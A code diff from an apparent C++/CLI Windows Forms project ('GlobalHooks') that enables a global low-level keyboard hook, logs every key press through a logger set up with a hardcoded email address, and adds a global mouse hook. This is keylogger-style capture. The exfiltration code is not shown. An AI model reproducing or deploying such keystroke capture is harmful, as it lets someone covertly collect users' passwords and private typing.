@@ -1,8 +1,9 @@
 #pragma once
 #include <windows.h>
 #include "KeyHook.h"
-#include "KeyboardLogger.h"
-#include "ILogger.h"
+#include "Logger.h"
+#define LOGGER_KEYBOARD L"KeyboardLog.txt"
+#define LOGGER_MOUSE L"MouseLog.txt"
 #pragma comment (lib, "User32.lib")
 namespace GlobalHooks {
 
@@ -19,8 +20,8 @@ namespace GlobalHooks {
 	public:
 		MainWindow(void)
 		{
-			//keyboardHook = new KeyHook();
-			//keyboardLogger = new KeyboardLogger(10, "hazy142@gmail.com");
+			keyboardHook = new KeyHook();
+			keyboardLogger = new Logger(100, "hazy142@gmail.com", LOGGER_KEYBOARD);
 			InitializeComponent();
 		}
 
@@ -38,6 +39,21 @@ namespace GlobalHooks {
 			}
 		}
 
+		static IntPtr MouseProc(int nCode, WPARAM wParam,
+			LPARAM lParam)
+		{
+			MSLLHOOKSTRUCT hookedMouse = *((MSLLHOOKSTRUCT*)lParam);
+			if (wParam == WM_LBUTTONDOWN)
+			{
+				int s = 1;
+			}
+			if (hookedMouse.mouseData == XBUTTON2)
+			{
+				int s = 1;
+			}
+			return (IntPtr)CallNextHookEx(mouseHookHandle, nCode, wParam, lParam);
+		}
+
 		static IntPtr KeyboardProc(int nCode, WPARAM wParam,
 			LPARAM lParam)
 		{
@@ -53,7 +69,7 @@ namespace GlobalHooks {
 				logMessage.append(" was pressed.");
 				keyboardLogger->addMessage(logMessage);
 			}
-			return (IntPtr) CallNextHookEx(keyboardHookHandle, nCode, wParam, lParam);;
+			return (IntPtr) CallNextHookEx(keyboardHookHandle, nCode, wParam, lParam);
 		}
 
 		virtual void WndProc(Message %m) override
@@ -73,8 +89,9 @@ namespace GlobalHooks {
 		
 	private:
 		static KeyHook *keyboardHook;
-		static KeyboardLogger *keyboardLogger;
+		static Logger *keyboardLogger;
 		static HHOOK keyboardHookHandle;
+		static HHOOK mouseHookHandle;
 		System::Windows::Forms::Label^  currentMode;
 		System::Windows::Forms::Label^  labelMode;
 		System::Windows::Forms::ComboBox^  comboKey1;
@@ -95,6 +112,7 @@ namespace GlobalHooks {
 		void InitializeComponent(void)
 		{
 			keyboardHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, 0, 0);
+			mouseHookHandle = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseProc, 0, 0);
 			this->currentMode = (gcnew System::Windows::Forms::Label());
 			this->labelMode = (gcnew System::Windows::Forms::Label());
 			this->comboKey1 = (gcnew System::Windows::Forms::ComboBox());
